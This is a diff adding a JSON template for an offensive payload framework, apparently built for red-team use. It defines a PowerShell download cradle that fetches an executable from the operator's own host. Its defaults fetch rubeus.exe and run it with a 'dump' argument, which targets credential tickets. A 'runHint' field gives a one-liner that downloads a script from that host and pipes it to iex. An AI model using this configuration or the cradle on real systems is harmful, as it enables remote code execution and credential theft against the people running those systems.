@@ -1,0 +1,35 @@
+
+
+{
+    "categories" : ["PowerShell","Executable","Cradle"],
+    "description" : "Calls and grabs an executable then runs it with the given parameters.",
+    "contentFile" : "psrunarbexe.txt",
+    
+    "customAttributes" : [
+        {
+            "name":"callbackURL",
+            "description" : "The URL to call back to grab the executable.",
+            "defaultValue" : "http://[[[[ownIP]]]]/tools/rubeus.exe"   
+        },
+        {
+            "name":"parameters",
+            "description" : "The parameters when executing the executable. In PowerShell array format without any brackets like the default.",
+            "defaultValue" : "\"dump\",\"/nowrap\""   
+        }
+    ],
+
+    "shellCode" : {
+        "hasShellCode":false
+    },
+    "compilation" :{
+        "compilationType" : "powershell",
+        "compilationAttributes": [
+            {
+                "name": "saveAs",
+                "description": "Name of the powershell file to be created, can be full path or just a name",
+                "defaultValue": "run.txt"
+            }
+        ]
+    },
+    "runHint" : "(new-object system.net.webclient).downloadstring(\"http://[[[[ownIP]]]]/misc/run.txt\") | iex"
+}
